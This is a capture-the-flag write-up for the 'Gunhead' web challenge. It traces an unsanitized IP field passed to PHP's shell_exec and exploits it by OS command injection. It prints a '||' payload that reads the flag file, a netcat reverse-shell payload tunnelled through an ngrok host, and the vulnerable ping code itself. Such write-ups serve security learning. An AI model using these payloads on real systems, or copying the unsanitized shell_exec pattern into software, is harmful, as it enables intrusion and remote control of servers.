# Gunhead

## Overview

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

During Pandora's training, the Gunhead AI combat robot had been tampered with and was now malfunctioning, causing it to become uncontrollable. With the situation escalating rapidly, Pandora used her hacking skills to infiltrate the managing system of Gunhead and urgently needs to take it down.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318210721.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318210741.png)

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/Web/Gunhead/web_gunhead.zip):**
```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Web/Gunhead)-[2023.03.18|21:08:57(HKT)]
└> file web_gunhead.zip                          
web_gunhead.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Web/Gunhead)-[2023.03.18|21:08:59(HKT)]
└> unzip web_gunhead.zip                         
Archive:  web_gunhead.zip
   creating: web_gunhead/
   creating: web_gunhead/config/
  inflating: web_gunhead/config/fpm.conf  
  inflating: web_gunhead/config/supervisord.conf  
  inflating: web_gunhead/config/nginx.conf  
  inflating: web_gunhead/Dockerfile  
  inflating: web_gunhead/build-docker.sh  
 extracting: web_gunhead/flag.txt    
   creating: web_gunhead/challenge/
  inflating: web_gunhead/challenge/index.php  
   creating: web_gunhead/challenge/models/
  inflating: web_gunhead/challenge/models/ReconModel.php  
   creating: web_gunhead/challenge/static/
   creating: web_gunhead/challenge/static/css/
  inflating: web_gunhead/challenge/static/css/style.css  
   creating: web_gunhead/challenge/static/images/
  inflating: web_gunhead/challenge/static/images/terminal.png  
  inflating: web_gunhead/challenge/static/images/face.png  
 extracting: web_gunhead/challenge/static/images/needs.png  
  inflating: web_gunhead/challenge/static/images/back.png  
  inflating: web_gunhead/challenge/static/images/figure.png  
   creating: web_gunhead/challenge/static/js/
  inflating: web_gunhead/challenge/static/js/script.js  
  inflating: web_gunhead/challenge/static/js/jquery.js  
   creating: web_gunhead/challenge/static/fonts/
 extracting: web_gunhead/challenge/static/fonts/vt323.woff2  
  inflating: web_gunhead/challenge/static/fonts/intfallplus.ttf  
  inflating: web_gunhead/challenge/static/fonts/orbitron.woff  
  inflating: web_gunhead/challenge/Router.php  
   creating: web_gunhead/challenge/controllers/
  inflating: web_gunhead/challenge/controllers/ReconController.php  
   creating: web_gunhead/challenge/views/
  inflating: web_gunhead/challenge/views/index.php
```

But before we look into the source code, let's play with the application.

Status:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318211132.png)

This will show the status of the "Integer".

Needs:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318211226.png)

Show what the "Integer" needs.

***Commands:***

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318211255.png)

Oh! Looks like we can run some commands?

**Let's type `/help`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318211328.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318211333.png)

Cool! We can `/clear` the command prompt, `/ping [device IP]` to check recon system, `/storage` to check storage.

Hmm... I can smell some **OS command injection**!

Let's look at the source code!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318211548.png)

The web application's structure is using a model called **MVC, or Model-View-Controller**.

**In the `controllers/ReconController.php`, there's a `ping()` method:**
```php
<?php
class ReconController
{
    public function index($router)
    {
        return $router->view('index');
    }

    public function ping($router)
    {
        $jsonBody = json_decode(file_get_contents('php://input'), true);

        if (empty($jsonBody) || !array_key_exists('ip', $jsonBody))
        {
            return $router->jsonify(['message' => 'Insufficient parameters!']);
        }

        $pingResult = new ReconModel($jsonBody['ip']);

        return $router->jsonify(['output' => $pingResult->getOutput()]);
    }
}
```

The `ping()` method will get a decoded JSON body, and parse the `ip` key to `ReconModel()`.

What is `ReconModel()`?

***In the `models/ReconModel.php` is very interesting to us:***
```php
<?php
#[AllowDynamicProperties]

class ReconModel
{   
    public function __construct($ip)
    {
        $this->ip = $ip;
    }

    public function getOutput()
    {
        # Do I need to sanitize user input before passing it to shell_exec?
        return shell_exec('ping -c 3 '.$this->ip);
    }
}
```

As you can see, class `ReconModel`'s public method `getOutput()` is using a function called ***`shell_exec()`***, which **executing OS command**!!

If there's a **non-validated, sanitized input** get in there, we can achieve Remote Code Execution (RCE)!!

Remember, **the `$ip` is being parsed from the JSON body in `ping()` method!!**

That being said, we can get RCE via the `/ping` command!

## Exploitation

**Now, let's try to ping `127.0.0.1`, or localhost:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318212306.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318212321.png)

When we type that command, it'll send a POST request to `/api/ping`, with JSON body.

If there's no error, it responses us a JSON data, which is the command's output.

**Armed with above information, we can send that request to Burp Suite's Repeater, and inject some commands!!**

**After some testing the `||` works!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318212523.png)

Nice! Now we can confirm there's a RCE vulnerability via the `shell_exec`!

**Let's read the flag!**
```json
{
    "ip":" || cat ../flag.txt"
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318212633.png)

**Or, you can get a shell :D**
```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Web/Gunhead)-[2023.03.18|21:28:43(HKT)]
└> ngrok tcp 4444
[...]
Forwarding                    tcp://0.tcp.ap.ngrok.io:17969 -> localhost:4444
[...]
```

```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Web/Gunhead)-[2023.03.18|21:28:09(HKT)]
└> nc -lnvp 4444
listening on [any] 4444 ...
```

**Payload:**
```json
{
    "ip":" || nc 0.tcp.ap.ngrok.io 17969 -e '/bin/sh'"
}
```

```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Web/Gunhead)-[2023.03.18|21:28:09(HKT)]
└> nc -lnvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 56612
whoami;hostname;id;ip a
www
ng-gunhead-axuru-69c8bcb87c-nsl6z
uid=1000(www) gid=1000(www) groups=1000(www)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
26: eth0@if27: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether fa:1e:e5:23:24:12 brd ff:ff:ff:ff:ff:ff
    inet 10.244.17.207/32 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::f81e:e5ff:fe23:2412/64 scope link 
       valid_lft forever preferred_lft forever
cat ../flag.txt
HTB{4lw4y5_54n1t1z3_u53r_1nput!!!}
```

Nice! We're in!

- **Flag: `HTB{4lw4y5_54n1t1z3_u53r_1nput!!!}`**

## Conclusion

What we've learned:

1. OS Command Injection